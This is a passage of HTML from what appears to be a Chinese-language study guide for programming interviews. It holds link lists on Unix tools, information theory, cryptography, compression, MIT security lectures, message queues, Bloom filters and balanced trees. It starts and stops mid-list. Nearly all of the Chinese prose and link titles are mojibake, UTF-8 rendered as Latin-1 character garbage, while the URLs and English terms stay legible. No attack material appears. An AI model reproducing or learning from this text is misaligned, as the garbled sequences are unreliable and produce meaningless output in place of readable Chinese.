æ–‡ä»¶å’ŒåŒ…æœºåˆ¶</a></li></ul></li><li><a href="https://www.youtube.com/watch?v=JWD1Fpdd4Pc">Evil æ¨¡å¼: æˆ–è®¸, æˆ‘æ˜¯æ€æ ·å¯¹ Emacs è·¯äººè½¬ç²‰çš„ (è§†é¢‘)</a></li><li><a href="http://www.cs.yale.edu/homes/aspnes/classes/223/notes.html#Writing_C_programs_with_Emacs">ä½¿ç”¨ Emacs å¼€å‘ C ç¨‹åº</a></li><li><a href="https://www.youtube.com/watch?v=nsGYet02bEk">(æˆ–è®¸) æ·±åº¦ç»„ç»‡æ¨¡å¼:ç®¡ç†ç»“æ„ (è§†é¢‘)</a></li></ul></li></ul></li><li><h3><span id="unix-ming-ling-xing-gong-ju">Unix å‘½ä»¤è¡Œå·¥å…·</span></h3><ul><li>ä¸‹åˆ—å†…å®¹åŒ…å«ä¼˜ç§€å·¥å…·</li><li>bash</li><li>cat</li><li>grep</li><li>sed</li><li>awk</li><li>curl or wget</li><li>sort</li><li>tr</li><li>uniq</li><li><a href="https://en.wikipedia.org/wiki/Strace">strace</a></li><li><a href="https://danielmiessler.com/study/tcpdump/">tcpdump</a></li></ul></li><li><h3><span id="xin-xi-lun-shi-pin">ä¿¡æ¯è®º (è§†é¢‘)</span></h3><ul><li><a href="https://www.khanacademy.org/computing/computer-science/informationtheory">Khan Academy å¯æ±—å­¦é™¢</a></li><li>æ›´å¤šæœ‰å…³é©¬å°”å¯å¤«çš„å†…å®¹:<ul><li><a href="https://www.coursera.org/learn/data-structures-optimizing-performance/lecture/waxgx/core-markov-text-generation">é©¬å°”å¯å¤«å†…å®¹ç”Ÿæˆï¼ˆCore Markov Text Generationï¼‰</a></li><li><a href="https://www.coursera.org/learn/data-structures-optimizing-performance/lecture/gZhiC/core-implementing-markov-text-generation">Core Implementing Markov Text Generationé©¬å°”å¯å¤«å†…å®¹ç”Ÿæˆå®ç°</a></li><li><a href="https://www.coursera.org/learn/data-structures-optimizing-performance/lecture/EUjrq/project-markov-text-generation-walk-through">ä¸€ä¸ªé©¬å°”å¯å¤«å†…å®¹ç”Ÿæˆå™¨çš„é¡¹ç›®ï¼ˆProject = Markov Text Generation Walk Throughï¼‰</a></li></ul></li><li>å…³äºæ›´å¤šä¿¡æ¯ï¼Œè¯·å‚ç…§ä¸‹æ–¹ MIT 6.050J ä¿¡æ¯å’Œç³»ç»Ÿå¤æ‚åº¦çš„å†…å®¹ã€‚</li></ul></li><li><h3><span id="qi-ou-xiao-yan-wei-amp-han-ming-ma-shi-pin">å¥‡å¶æ ¡éªŒä½ &amp; æ±‰æ˜ç  (è§†é¢‘)</span></h3><ul><li><a href="https://www.youtube.com/watch?v=q-3BctoUpHE">å…¥é—¨</a></li><li><a href="https://www.youtube.com/watch?v=DdMcAUlxh1M">å¥‡å¶æ ¡éªŒä½</a></li><li>æ±‰æ˜ç (Hamming Code):<ul><li><a href="https://www.youtube.com/watch?v=1A_NcXxdoCc">å‘ç°é”™è¯¯</a></li><li><a href="https://www.youtube.com/watch?v=JAMLuxdHH8o">ä¿®æ­£é”™è¯¯</a></li></ul></li><li><a href="https://www.youtube.com/watch?v=wbH2VxzmoZk">æ£€æŸ¥é”™è¯¯</a></li></ul></li><li><h3><span id="xi-tong-shang-zhi-entropy">ç³»ç»Ÿç†µå€¼ï¼ˆEntropyï¼‰</span></h3><ul><li>è¯·å‚è€ƒä¸‹æ–¹è§†é¢‘</li><li>è§‚çœ‹ä¹‹å‰ï¼Œè¯·å…ˆç¡®å®šè§‚çœ‹äº†ä¿¡æ¯è®ºçš„è§†é¢‘</li><li><a href="https://youtu.be/JnJq3Py0dyM?t=176">ä¿¡æ¯ç†è®º, å…‹åŠ³å¾·Â·é¦™å†œ, ç†µå€¼, ç³»ç»Ÿå†—ä½™, æ•°æ®æ¯”ç‰¹å‹ç¼© (è§†é¢‘)</a></li></ul></li><li><h3><span id="mi-ma-xue">å¯†ç å­¦</span></h3><ul><li>è¯·å‚è€ƒä¸‹æ–¹è§†é¢‘</li><li>è§‚çœ‹ä¹‹å‰ï¼Œè¯·å…ˆç¡®å®šè§‚çœ‹äº†ä¿¡æ¯è®ºçš„è§†é¢‘</li><li><a href="https://www.khanacademy.org/computing/computer-science/%E5%AF%86%E7%A0%81%E5%AD%A6">å¯æ±—å­¦é™¢</a></li><li><a href="https://www.youtube.com/watch?v=KqqOXndnvic&amp;list=PLUl4u3cNGP6317WaSNfmCvGym2ucw3oGp&amp;index=30">å¯†ç å­¦: å“ˆå¸Œå‡½æ•°</a></li><li><a href="https://www.youtube.com/watch?v=9TNI2wHmaeI&amp;index=31&amp;list=PLUl4u3cNGP6317WaSNfmCvGym2ucw3oGp">å¯†ç å­¦: åŠ å¯†</a></li></ul></li><li><h3><span id="ya-suo">å‹ç¼©</span></h3><ul><li>è§‚çœ‹ä¹‹å‰ï¼Œè¯·å…ˆç¡®å®šè§‚çœ‹äº†ä¿¡æ¯è®ºçš„è§†é¢‘</li><li>Computerphile (è§†é¢‘)ï¼š<ul><li><a href="https://www.youtube.com/watch?v=Lto-ajuqW3w">å‹ç¼©</a></li><li><a href="https://www.youtube.com/watch?v=M5c_RFKVkko">å‹ç¼©ç†µå€¼</a></li><li><a href="https://www.youtube.com/watch?v=umTbivyJoiI">ç”±ä¸Šè€Œä¸‹çš„æ ‘ (éœå¤«æ›¼ç¼–ç æ ‘)</a></li><li><a href="https://www.youtube.com/watch?v=DV8efuB3h2g">é¢å¤–æ¯”ç‰¹ - éœå¤«æ›¼ç¼–ç æ ‘</a></li><li><a href="https://www.youtube.com/watch?v=goOa3DGezUA">ä¼˜é›…çš„å‹ç¼©æ•°æ® (æ— æŸæ•°æ®å‹ç¼©æ–¹æ³•)</a></li><li><a href="https://www.youtube.com/watch?v=cCDCfoHTsaU">Text Compression Meets Probabilities</a></li></ul></li><li><a href="https://www.youtube.com/playlist?list=PLOU2XLYxmsIJGErt5rrCqaSGTMyyqNt2H">æ•°æ®å‹ç¼©çš„è‰ºæœ¯</a></li><li><a href="https://www.youtube.com/watch?v=whGwm0Lky2s">(å¯é€‰) è°·æ­Œå¼€å‘è€…ï¼šGZIP è¿˜å·®è¿œäº†å‘¢!</a></li></ul></li><li><h3><span id="ji-suan-ji-an-quan">è®¡ç®—æœºå®‰å…¨</span></h3><ul><li><a href="https://www.youtube.com/playlist?list=PLUl4u3cNGP62K2DjQLRxDNRi0z2IRWnNh">MITï¼ˆ23ä¸ªè§†é¢‘ï¼‰</a><ul><li><a href="https://www.youtube.com/watch?v=GqmQg-cszw4&amp;index=1&amp;list=PLUl4u3cNGP62K2DjQLRxDNRi0z2IRWnNh">å¨èƒæ¨¡å‹ï¼šå…¥é—¨</a></li><li><a href="https://www.youtube.com/watch?v=6bwzNg5qQ0o&amp;list=PLUl4u3cNGP62K2DjQLRxDNRi0z2IRWnNh&amp;index=2">æ§åˆ¶åŠ«æŒæ”»å‡»</a></li><li><a href="https://www.youtube.com/watch?v=drQyrzRoRiA&amp;list=PLUl4u3cNGP62K2DjQLRxDNRi0z2IRWnNh&amp;index=3">ç¼“å†²åŒºæº¢å‡ºæ¼æ´æ”»å‡»å’Œé˜²å¾¡</a></li><li><a href="https://www.youtube.com/watch?v=6SIJmoE9L9g&amp;index=4&amp;list=PLUl4u3cNGP62K2DjQLRxDNRi0z2IRWnNh">ä¼˜å…ˆæƒåŒºåˆ†</a></li><li><a href="https://www.youtube.com/watch?v=8VqTSY-11F4&amp;index=5&amp;list=PLUl4u3cNGP62K2DjQLRxDNRi0z2IRWnNh">èƒ½åŠ›</a></li><li><a href="https://www.youtube.com/watch?v=VEV74hwASeU&amp;list=PLUl4u3cNGP62K2DjQLRxDNRi0z2IRWnNh&amp;index=6">åœ¨æ²™ç›’ä¸­è¿è¡ŒåŸç”Ÿä»£ç </a></li><li><a href="https://www.youtube.com/watch?v=chkFBigodIw&amp;index=7&amp;list=PLUl4u3cNGP62K2DjQLRxDNRi0z2IRWnNh">ç½‘ç»œå®‰å…¨æ¨¡å‹</a></li><li><a href="https://www.youtube.com/watch?v=EBQIGy1ROLY&amp;index=8&amp;list=PLUl4u3cNGP62K2DjQLRxDNRi0z2IRWnNh">ç½‘ç»œå®‰å…¨åº”ç”¨</a></li><li><a href="https://www.youtube.com/watch?v=yRVZPvHYHzw&amp;index=9&amp;list=PLUl4u3cNGP62K2DjQLRxDNRi0z2IRWnNh">æ ‡å¿—åŒ–æ‰§è¡Œ</a></li><li><a href="https://www.youtube.com/watch?v=SIEVvk3NVuk&amp;index=11&amp;list=PLUl4u3cNGP62K2DjQLRxDNRi0z2IRWnNh">ç½‘ç»œå®‰å…¨</a></li><li><a href="https://www.youtube.com/watch?v=QOtA76ga_fY&amp;index=12&amp;list=PLUl4u3cNGP62K2DjQLRxDNRi0z2IRWnNh">ç½‘ç»œåè®®</a></li><li><a href="https://www.youtube.com/watch?v=PuVMkSEcPiI&amp;index=15&amp;list=PLUl4u3cNGP62K2DjQLRxDNRi0z2IRWnNh">æ—è·¯æ”»å‡»</a></li></ul></li></ul></li><li><h3><span id="la-ji-hui-shou">åƒåœ¾å›æ”¶</span></h3><ul><li>[ ] <a href="https://www.youtube.com/watch?v=iHVs_HkjdmI">Python ä¸­çš„åƒåœ¾å›æ”¶ (è§†é¢‘)</a></li><li>[ ] <a href="https://www.infoq.com/presentations/garbage-collection-benefits">æ·±åº¦è§£æï¼šè®ºåƒåœ¾å›æ”¶åœ¨ JAVA ä¸­çš„é‡è¦æ€§</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=P-8Z0-MhdQs&amp;list=PLdzf4Clw0VbOEWOS_sLhT_9zaiQDrS5AR&amp;index=3">æ·±åº¦è§£æï¼šè®ºåƒåœ¾å›æ”¶åœ¨ Python ä¸­çš„é‡è¦æ€§(è§†é¢‘)</a></li></ul></li><li><h3><span id="bing-xing-bian-cheng">å¹¶è¡Œç¼–ç¨‹</span></h3><ul><li>[ ] <a href="https://www.coursera.org/learn/parprog1/home/week/1">Coursera (Scala)</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=uY85GkaYzBk">ç”¨äºé«˜æ€§èƒ½å¹¶è¡Œè®¡ç®—çš„é«˜æ•ˆPythonï¼ˆè§†é¢‘ï¼‰</a></li></ul></li><li><h3><span id="xiao-xi-chuan-di-xu-lie-hua-he-dui-lie-xi-tong">æ¶ˆæ¯ä¼ é€’ï¼Œåºåˆ—åŒ–å’Œé˜Ÿåˆ—ç³»ç»Ÿ</span></h3><ul><li><a href="https://thrift.apache.org/">Thrift</a><ul><li><a href="http://thrift-tutorial.readthedocs.io/en/latest/intro.html">æ•™ç¨‹</a></li></ul></li><li><a href="https://developers.google.com/protocol-buffers/">åè®®ç¼“å†²</a><ul><li><a href="https://developers.google.com/protocol-buffers/docs/tutorials">æ•™ç¨‹</a></li></ul></li><li><a href="http://www.grpc.io/">gRPC</a><ul><li><a href="https://www.youtube.com/watch?v=5tmPvSe7xXQ&amp;list=PLcTqM9n_dieN0k1nSeN36Z_ppKnvMJoly&amp;index=1">gRPC å¯¹äºJAVAå¼€å‘è€…çš„å…¥é—¨æ•™ç¨‹ï¼ˆè§†é¢‘ï¼‰</a></li></ul></li><li><a href="http://redis.io/">Redis</a><ul><li><a href="http://try.redis.io/">æ•™ç¨‹</a></li></ul></li><li><a href="https://aws.amazon.com/sqs/">Amazonçš„ SQS ç³»ç»Ÿ (é˜Ÿåˆ—)</a></li><li><a href="https://aws.amazon.com/sns/">Amazonçš„ SNS ç³»ç»Ÿ (pub-sub)</a></li><li><a href="https://www.rabbitmq.com/">RabbitMQ</a><ul><li><a href="https://www.rabbitmq.com/getstarted.html">å…¥é—¨æ•™ç¨‹</a></li></ul></li><li><a href="http://www.celeryproject.org/">Celery</a><ul><li><a href="http://docs.celeryproject.org/en/latest/getting-started/first-steps-with-celery.html">Celeryå…¥é—¨</a></li></ul></li><li><a href="http://zeromq.org/">ZeroMQ</a><ul><li><a href="http://zeromq.org/intro:read-the-manual">å…¥é—¨æ•™ç¨‹</a></li></ul></li><li><a href="http://activemq.apache.org/">ActiveMQ</a></li><li><a href="http://kafka.apache.org/documentation.html#introduction">Kafka</a></li><li><a href="http://msgpack.org/index.html">MessagePack</a></li><li><a href="https://avro.apache.org/">Avro</a></li></ul></li><li><h3><span id="a-sou-suo-suan-fa">A*æœç´¢ç®—æ³•</span></h3><ul><li><a href="https://en.wikipedia.org/wiki/A*_search_algorithm">A æœç´¢ç®—æ³•</a></li><li><a href="https://www.youtube.com/watch?v=KNXfSOx4eEE">A* è·¯å¾„æœç´¢æ•™ç¨‹ï¼ˆæ•™ç¨‹ï¼‰</a></li><li><a href="https://www.youtube.com/watch?v=-L-WgKMFuhE">A* è·¯å¾„æœç´¢ï¼ˆE01ï¼šç®—æ³•è§£é‡Šï¼‰ï¼ˆè§†é¢‘ï¼‰</a></li></ul></li><li><h3><span id="kuai-su-fu-li-xie-bian-huan">å¿«é€Ÿå‚…é‡Œå¶å˜æ¢</span></h3><ul><li><a href="https://betterexplained.com/articles/an-interactive-guide-to-the-fourier-transform/">å‚…ç«‹å¶å˜æ¢çš„äº¤äº’å¼æŒ‡å—</a></li><li><a href="http://www.askamathematician.com/2012/09/q-what-is-a-fourier-transform-what-is-it-used-for/">ä»€ä¹ˆæ˜¯å‚…ç«‹å¶å˜æ¢ï¼Ÿè®ºå‚…ç«‹å¶å˜æ¢çš„ç”¨é€”</a></li><li><a href="https://www.youtube.com/watch?v=Xxut2PN-V8Q">ä»€ä¹ˆæ˜¯å‚…ç«‹å¶å˜æ¢ï¼Ÿ (è§†é¢‘)</a></li><li><a href="https://www.youtube.com/watch?v=iTMn0Kt18tg&amp;list=PLUl4u3cNGP6317WaSNfmCvGym2ucw3oGp&amp;index=4">åˆ†è€Œæ²»ä¹‹ï¼šFFTï¼ˆè§†é¢‘ï¼‰</a></li><li><a href="http://jakevdp.github.io/blog/2013/08/28/understanding-the-fft/">FTT æ˜¯ä»€ä¹ˆ</a></li></ul></li><li><h3><span id="bu-long-guo-lu-qi">å¸ƒéš†è¿‡æ»¤å™¨</span></h3><ul><li>ç»™å®šå¸ƒéš†è¿‡æ»¤å™¨mæ¯”ç‰¹ä½å’Œkä¸ªå“ˆå¸Œå‡½æ•°ï¼Œæ’å…¥å’Œæˆå‘˜æ£€æµ‹éƒ½ä¼šæ˜¯ O(k)ã€‚</li><li><a href="https://www.youtube.com/watch?v=-SuTGoFYjZs">å¸ƒéš†è¿‡æ»¤å™¨ï¼ˆè§†é¢‘ï¼‰</a></li><li><a href="https://www.youtube.com/watch?v=qBTdukbzc78">å¸ƒéš†è¿‡æ»¤å™¨ | æ•°æ®æŒ–æ˜ | Stanford Universityï¼ˆè§†é¢‘ï¼‰</a></li><li><a href="http://billmill.org/bloomfilter-tutorial/">æ•™ç¨‹</a></li><li><a href="http://blog.michaelschmatz.com/2016/04/11/how-to-write-a-bloom-filter-cpp/">å¦‚ä½•å†™ä¸€ä¸ªå¸ƒéš†è¿‡æ»¤å™¨åº”ç”¨</a></li></ul></li><li><h3><span id="hyperloglog">HyperLogLog</span></h3><ul><li><a href="http://highscalability.com/blog/2012/4/5/big-data-counting-how-to-count-a-billion-distinct-objects-us.html">å¦‚ä½•ä»…ä½¿ç”¨1.5KBå†…å­˜è®¡ç®—åäº¿ä¸ªä¸åŒçš„å¯¹è±¡</a></li></ul></li><li><h3><span id="ju-bu-min-gan-ha-xi">å±€éƒ¨æ•æ„Ÿå“ˆå¸Œ</span></h3><ul><li>ç”¨äºç¡®å®šæ–‡ä»¶çš„ç›¸ä¼¼æ€§</li><li>MD5 æˆ– SHA çš„åä¹‰è¯ï¼Œç”¨äºç¡®å®š2ä¸ªæ–‡æ¡£/å­—ç¬¦ä¸²æ˜¯å¦å®Œå…¨ç›¸åŒ</li><li><a href="http://ferd.ca/simhashing-hopefully-made-simple.html">Simhashingï¼ˆå¸Œæœ›å¦‚æ­¤ï¼‰å˜å¾—ç®€å•</a></li></ul></li><li><h3><span id="van-emde-boas-shu">van Emde Boas æ ‘</span></h3><ul><li><a href="https://www.youtube.com/watch?v=hmReJCupbNU&amp;list=PLUl4u3cNGP6317WaSNfmCvGym2ucw3oGp&amp;index=6">åˆ†è€Œæ²»ä¹‹ï¼švan Emde Boas æ ‘ (è§†é¢‘)</a></li><li><a href="https://ocw.mit.edu/courses/electrical-engineering-and-computer-science/6-046j-design-and-analysis-of-algorithms-spring-2012/lecture-notes/MIT6_046JS12_lec15.pdf">MITè¯¾å ‚ç¬”è®°</a></li></ul></li><li><h3><span id="zeng-qiang-shu-ju-jie-gou">å¢å¼ºæ•°æ®ç»“æ„</span></h3><ul><li><a href="https://youtu.be/zksIj9O8_jc?list=PL4BBB74C7D2A1049C&amp;t=950">CS 61B ç¬¬ 39 è¯¾: å¢å¼ºæ•°æ®ç»“æ„</a></li></ul></li><li><h3><span id="ping-heng-cha-zhao-shu-balanced-search-trees">å¹³è¡¡æŸ¥æ‰¾æ ‘ï¼ˆBalanced search treesï¼‰</span></h3><ul><li><p>æŒæ¡è‡³å°‘ä¸€ç§å¹³è¡¡æŸ¥æ‰¾æ ‘ï¼ˆå¹¶æ‡‚å¾—å¦‚ä½•å®ç°ï¼‰ï¼š</p></li><li><p>â€œåœ¨å„ç§å¹³è¡¡æŸ¥æ‰¾æ ‘å½“ä¸­ï¼ŒAVL æ ‘å’Œ2-3æ ‘å·²ç»æˆä¸ºäº†è¿‡å»ï¼Œè€Œçº¢é»‘æ ‘ï¼ˆred-black treesï¼‰çœ‹ä¼¼å˜å¾—è¶Šæ¥è¶Šå—äººé’çã€‚è¿™ç§ä»¤äººç‰¹åˆ«æ„Ÿå…´è¶£çš„æ•°æ®ç»“æ„ï¼Œäº¦ç§°ä¼¸å±•æ ‘ï¼ˆsplay treeï¼‰ã€‚å®ƒå¯ä»¥è‡ªæˆ‘ç®¡ç†ï¼Œä¸”ä¼šä½¿ç”¨è½®æ¢æ¥ç§»é™¤ä»»ä½•è®¿é—®è¿‡æ ¹èŠ‚ç‚¹çš„é”®ã€‚â€ â€”â€” Skiena</p></li><li><p>å› æ­¤ï¼Œåœ¨å„ç§å„æ ·çš„å¹³è¡¡æŸ¥æ‰¾æ ‘å½“ä¸­ï¼Œæˆ‘é€‰æ‹©äº†ä¼¸å±•æ ‘æ¥å®ç°ã€‚è™½ç„¶ï¼Œé€šè¿‡æˆ‘çš„é˜…è¯»ï¼Œæˆ‘å‘ç°åœ¨é¢è¯•ä¸­å¹¶ä¸ä¼šè¢«è¦æ±‚å®ç°ä¸€æ£µå¹³è¡¡æŸ¥æ‰¾æ ‘ã€‚ä½†æ˜¯ï¼Œä¸ºäº†èƒœäººä¸€ç­¹ï¼Œæˆ‘ä»¬è¿˜æ˜¯åº”è¯¥çœ‹çœ‹å¦‚ä½•å»å®ç°ã€‚åœ¨é˜…è¯»äº†å¤§é‡å…³äºçº¢é»‘æ ‘çš„ä»£ç åï¼Œæˆ‘æ‰å‘ç°ä¼¸å±•æ ‘çš„å®ç°ç¡®å®ä¼šä½¿å¾—å„æ–¹é¢æ›´ä¸ºé«˜æ•ˆã€‚</p><ul><li>ä¼¸å±•æ ‘ï¼šæ’å…¥ã€æŸ¥æ‰¾ã€åˆ é™¤å‡½æ•°çš„å®ç°ï¼Œè€Œå¦‚æœä½ æœ€ç»ˆå®ç°äº†çº¢é»‘æ ‘ï¼Œé‚£ä¹ˆè¯·å°è¯•ä¸€ä¸‹ï¼š</li><li>è·³è¿‡åˆ é™¤å‡½æ•°ï¼Œç›´æ¥å®ç°æœç´¢å’Œæ’å…¥åŠŸèƒ½</li></ul></li><li><p>æˆ‘å¸Œæœ›èƒ½é˜…è¯»åˆ°æ›´å¤šå…³äº B æ ‘çš„èµ„æ–™ï¼Œå› ä¸ºå®ƒä¹Ÿè¢«å¹¿æ³›åœ°åº”ç”¨åˆ°å¤§å‹çš„æ•°æ®é›†å½“ä¸­ã€‚</p></li><li><p><a href="https://en.wikipedia.org/wiki/Self-balancing_binary_search_tree">è‡ªå¹³è¡¡äºŒå‰æŸ¥æ‰¾æ ‘</a></p></li><li><p><strong>AVL æ ‘</strong></p><ul><li>å®é™…ä¸­ï¼šæˆ‘èƒ½å‘Šè¯‰ä½ çš„æ˜¯ï¼Œè¯¥ç§æ ‘å¹¶æ— å¤ªå¤šçš„ç”¨é€”ï¼Œä½†æˆ‘èƒ½çœ‹åˆ°æœ‰ç”¨çš„åœ°æ–¹åœ¨å“ªé‡Œï¼šAVL æ ‘æ˜¯å¦ä¸€ç§å¹³è¡¡æŸ¥æ‰¾æ ‘ç»“æ„ã€‚å…¶å¯æ”¯æŒæ—¶é—´å¤æ‚åº¦ä¸º O(log n) çš„æŸ¥è¯¢ã€æ’å…¥åŠåˆ é™¤ã€‚å®ƒæ¯”çº¢é»‘æ ‘ä¸¥æ ¼æ„ä¹‰ä¸Šæ›´ä¸ºå¹³è¡¡ï¼Œä»è€Œå¯¼è‡´æ’å…¥å’Œåˆ é™¤æ›´æ…¢ï¼Œä½†éå†å´æ›´å¿«ã€‚æ­£å› å¦‚æ­¤ï¼Œæ‰å½°æ˜¾å…¶ç»“æ„çš„é­…åŠ›ã€‚åªéœ€è¦æ„å»ºä¸€æ¬¡ï¼Œå°±å¯ä»¥åœ¨ä¸é‡æ–°æ„é€ çš„æƒ…å†µä¸‹è¯»å–ï¼Œé€‚åˆäºå®ç°è¯¸å¦‚è¯­è¨€å­—å…¸ï¼ˆæˆ–ç¨‹åºå­—å…¸ï¼Œå¦‚ä¸€ä¸ªæ±‡ç¼–ç¨‹åºæˆ–è§£é‡Šç¨‹åºçš„æ“ä½œç ï¼‰ã€‚</li><li><a href="https://www.youtube.com/watch?v=FNeL18KsWPc&amp;list=PLUl4u3cNGP61Oq3tWYp6V_F-5jb5L2iHb&amp;index=6">MIT AVL æ ‘ / AVL æ ‘çš„æ’åºï¼ˆè§†é¢‘ï¼‰</a></li><li><a href="https://www.coursera.org/learn/data-structures/lecture/Qq5E0/avl-trees">AVL æ ‘ï¼ˆè§†é¢‘ï¼‰</a></li><li><a href="https://www.coursera.org/learn/data-structures/lecture/PKEBC/avl-tree-implementation">AVL æ ‘çš„å®ç°ï¼ˆè§†é¢‘ï¼‰</a></li><li><a href="https://www.coursera.org/learn/data-structures/lecture/22BgE/split-and-merge">åˆ†ç¦»ä¸åˆå¹¶</a></li></ul></li><li><p><strong>ä¼¸å±•æ ‘</strong></p><ul><li>å®é™…ä¸­ï¼šä¼¸å±•æ ‘ä¸€èˆ¬ç”¨äºç¼“å­˜ã€å†…å­˜åˆ†é…è€…ã€è·¯ç”±å™¨ã€åƒåœ¾å›æ”¶è€…ã€æ•°æ®å‹ç¼©ã€ropesï¼ˆå­—ç¬¦ä¸²çš„ä¸€ç§æ›¿ä»£å“ï¼Œç”¨äºå­˜å‚¨é•¿ä¸²çš„æ–‡æœ¬å­—ç¬¦ï¼‰ã€Windows NTï¼ˆè™šæ‹Ÿå†…å­˜ã€ç½‘ç»œåŠæ–‡ä»¶ç³»ç»Ÿï¼‰ç­‰çš„å®ç°ã€‚</li><li><a href="https://www.youtube.com/watch?v=Najzh1rYQTo&amp;index=23&amp;list=PL-XXv-cvA_iAlnI-BQr9hjqADPBtujFJd">CS 61Bï¼šä¼¸å±•æ ‘ï¼ˆSplay treesï¼‰ï¼ˆè§†é¢‘ï¼‰</a></li><li>MIT æ•™ç¨‹ï¼šä¼¸å±•æ ‘ï¼ˆSplay treesï¼‰ï¼š<ul><li>è¯¥æ•™ç¨‹ä¼šè¿‡äºå­¦æœ¯ï¼Œä½†è¯·è§‚çœ‹åˆ°æœ€åçš„10åˆ†é’Ÿä»¥ç¡®ä¿æŒæ¡ã€‚</li><li><a href="https://www.youtube.com/watch?v=QnPl_Y6EqMo">è§†é¢‘</a></li></ul></li></ul></li><li><p><strong>çº¢é»‘æ ‘</strong></p><ul><li>è¿™äº›æ˜¯2-3æ£µæ ‘çš„ç¿»è¯‘ï¼ˆè¯·å‚è§ä¸‹æ–‡ï¼‰ã€‚</li><li>å®é™…ä¸­ï¼šçº¢é»‘æ ‘æä¾›äº†åœ¨æœ€åæƒ…å†µä¸‹æ’å…¥æ“ä½œã€åˆ é™¤æ“ä½œå’ŒæŸ¥æ‰¾æ“ä½œçš„æ—¶é—´ä¿è¯ã€‚è¿™äº›æ—¶é—´å€¼çš„ä¿éšœä¸ä»…å¯¹æ—¶é—´æ•æ„Ÿå‹åº”ç”¨æœ‰ç”¨ï¼Œä¾‹å¦‚å®æ—¶åº”ç”¨ï¼Œè¿˜å¯¹åœ¨å…¶ä»–æ•°æ®ç»“æ„ä¸­å—çš„æ„å»ºéå¸¸æœ‰ç”¨ï¼Œè€Œè¿™äº›æ•°æ®ç»“æ„éƒ½æä¾›äº†æœ€åæƒ…å†µä¸‹çš„ä¿éšœï¼›ä¾‹å¦‚ï¼Œè®¸å¤šç”¨äºè®¡ç®—å‡ ä½•å­¦çš„æ•°æ®ç»“æ„éƒ½å¯ä»¥åŸºäºçº¢é»‘æ ‘ï¼Œè€Œç›®å‰ Linux å†…æ ¸æ‰€é‡‡ç”¨çš„å®Œå…¨å…¬å¹³è°ƒåº¦å™¨ï¼ˆthe Completely Fair Schedulerï¼‰ä¹Ÿä½¿ç”¨åˆ°äº†è¯¥ç§æ ‘ã€‚åœ¨ Java 8ä¸­ï¼ŒCollection HashMapä¹Ÿä»åŸæœ¬ç”¨Linked Listå®ç°ï¼Œå‚¨å­˜ç‰¹å®šå…ƒç´ çš„å“ˆå¸Œç ï¼Œæ”¹ä¸ºç”¨çº¢é»‘æ ‘å®ç°ã€‚</li><li><a href="https://youtu.be/1W3x0f_RmUo?list=PLFDnELG9dpVxQCxuD-9BSy2E7BWY3t5Sm&amp;t=3871">Aduni â€”â€” ç®—æ³• â€”â€” è¯¾ç¨‹4ï¼ˆè¯¥é“¾æ¥ç›´æ¥è·³åˆ°å¼€å§‹éƒ¨åˆ†ï¼‰ï¼ˆè§†é¢‘ï¼‰</a></li><li><a href="https://www.youtube.com/watch?v=hm2GHwyKF1o&amp;list=PLFDnELG9dpVxQCxuD-9BSy2E7BWY3t5Sm&amp;index=5">Aduni â€”â€” ç®—æ³• â€”â€” è¯¾ç¨‹5ï¼ˆè§†é¢‘ï¼‰</a></li><li><a href="https://en.wikipedia.org/wiki/Red%E2%80%93black_tree">é»‘æ ‘ï¼ˆBlack Treeï¼‰</a></li><li><a href="https://www.topcoder.com/community/data-science/data-science-tutorials/an-introduction-to-binary-search-and-red-black-trees/">äºŒåˆ†æŸ¥æ‰¾åŠçº¢é»‘æ ‘çš„ä»‹ç»</a></li></ul></li><li><p><strong>2-3æŸ¥æ‰¾æ ‘</strong></p><ul><li>å®é™…ä¸­ï¼š2-3æ ‘çš„å…ƒç´ æ’å…¥éå¸¸å¿«é€Ÿï¼Œä½†å´æœ‰ç€æŸ¥è¯¢æ…¢çš„ä»£ä»·ï¼ˆå› ä¸ºç›¸æ¯”è¾ƒ AVL æ ‘æ¥è¯´ï¼Œå…¶é«˜åº¦æ›´é«˜ï¼‰ã€‚</li><li>ä½ ä¼šå¾ˆå°‘ç”¨åˆ°2-3æ ‘ã€‚è¿™æ˜¯å› ä¸ºï¼Œå…¶å®ç°è¿‡ç¨‹ä¸­æ¶‰åŠåˆ°ä¸åŒç±»å‹çš„èŠ‚ç‚¹ã€‚å› æ­¤ï¼Œäººä»¬æ›´å¤šåœ°ä¼šé€‰æ‹©çº¢é»‘æ ‘ã€‚</li><li><a href="https://www.youtube.com/watch?v=C3SsdUqasD4&amp;list=PLA5Lqm4uh9Bbq-E0ZnqTIa8LRaL77ica6&amp;index=2">2-3æ ‘çš„ç›´æ„Ÿä¸å®šä¹‰ï¼ˆè§†é¢‘ï¼‰</a></li><li><a href="https://www.youtube.com/watch?v=iYvBtGKsqSg&amp;index=3&amp;list=PLA5Lqm4uh9Bbq-E0ZnqTIa8LRaL77ica6">2-3æ ‘çš„äºŒå…ƒè§‚ç‚¹</a></li><li><a href="https://www.youtube.com/watch?v=TOb1tuEZ2X4&amp;index=5&amp;list=PLUl4u3cNGP6317WaSNfmCvGym2ucw3oGp">2-3æ ‘ï¼ˆå­¦ç”Ÿå™è¿°ï¼‰ï¼ˆè§†é¢‘ï¼‰</a></li></ul></li><li><p><strong>2-3-4æ ‘ (äº¦ç§°2-4æ ‘)</strong></p><ul><li>å®é™…ä¸­ï¼šå¯¹äºæ¯ä¸€æ£µ2-4æ ‘ï¼Œéƒ½æœ‰ç€å¯¹åº”çš„çº¢é»‘æ ‘æ¥å­˜å‚¨åŒæ ·é¡ºåºçš„æ•°æ®å…ƒç´ ã€‚åœ¨2-4æ ‘ä¸Šè¿›è¡Œæ’å…¥åŠåˆ é™¤æ“ä½œç­‰åŒäºåœ¨çº¢é»‘æ ‘ä¸Šè¿›è¡Œé¢œè‰²ç¿»è½¬åŠè½®æ¢ã€‚è¿™ä½¿å¾—2-4æ ‘æˆä¸ºä¸€ç§ç”¨äºæŒæ¡çº¢é»‘æ ‘èƒŒåé€»è¾‘çš„é‡è¦å·¥å…·ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆè®¸å¤šç®—æ³•å¼•å¯¼æ–‡ç« éƒ½ä¼šåœ¨ä»‹ç»çº¢é»‘æ ‘ä¹‹å‰ï¼Œå…ˆä»‹ç»2-4æ ‘ï¼Œå°½ç®¡<strong>2-4æ ‘åœ¨å®é™…ä¸­å¹¶ä¸ç»å¸¸ä½¿ç”¨</strong>ã€‚</li><li><a href="https://www.youtube.com/watch?v=zqrqYXkth6Q&amp;index=26&amp;list=PL4BBB74C7D2A1049C">CS 61B Lecture 